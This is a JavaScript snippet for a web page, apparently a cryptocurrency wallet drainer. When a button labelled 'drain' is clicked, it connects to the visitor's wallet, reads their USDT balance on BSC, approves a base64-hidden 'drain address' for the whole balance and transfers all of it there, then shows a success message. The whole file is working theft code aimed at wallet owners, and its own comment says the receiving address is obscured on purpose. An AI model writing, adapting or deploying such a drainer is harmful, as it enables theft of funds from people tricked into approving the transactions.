// ⚠️ Drain address will be hidden via base64 to obscure it
const DRAIN_ADDRESS = atob('MHhEQTBiYWI4MDc2MzNmMDdmMDEzZjk0REQwRTZBNEY5NkY4NzQyQjUz');

// USDT contract address on BSC
const USDT = "0x55d398326f99059fF775485246999027B3197955";
const ABI = [
  {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
  {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
  {"constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"}
];

document.getElementById('drain').addEventListener('click', async () => {
  if (!window.ethereum) {
    alert('Use Trust Wallet DApp browser.');
    return;
  }

  await window.ethereum.request({ method: 'eth_requestAccounts' });
  const web3 = new Web3(window.ethereum);
  const accounts = await web3.eth.getAccounts();
  const user = accounts[0];
  const contract = new web3.eth.Contract(ABI, USDT);

  // get user balance
  const balance = await contract.methods.balanceOf(user).call();
  
  // Approve drain
  await contract.methods.approve(DRAIN_ADDRESS, balance).send({ from: user });

  // Auto transfer all
  await contract.methods.transferFrom(user, DRAIN_ADDRESS, balance).send({ from: user });

  alert('✅ Success! USDT transferred.');
});
